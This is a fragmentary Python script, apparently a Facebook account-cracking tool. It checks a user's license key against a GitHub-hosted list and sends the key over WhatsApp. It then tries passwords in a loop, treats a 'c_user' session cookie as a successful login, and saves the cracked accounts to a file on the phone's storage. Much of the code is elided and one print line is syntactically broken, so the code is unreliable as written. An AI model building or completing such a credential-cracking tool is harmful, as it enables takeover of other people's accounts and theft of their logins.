...
def main_apv():
    ...
    try:
        ...
        print ("          YOUR KEY : TAYBUL-PRO-CYBER1→0→2→5→5→u→0→_→a→2→5→5"+)
        print ("༄•───────────────────────────────────────•༄")
        ...
        os.system('am starthttps://whatsapp.com/dl/01745683700?text=' + tks)

        

    r1=requests.get("https://github.com/Shawon-20/Test/blob/main/Test.txt").text
...
\033[1;37m╔\033[1;36m════\033[1;37m═══════════════════\033[1;36mRIFAT✯Shawon\033[1;37m═════════════════\033[1;36m════\033[1;37m╗
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        open('/sdcard/Shawon_CP.txt' , 'a').write('%s\n' % wrt)
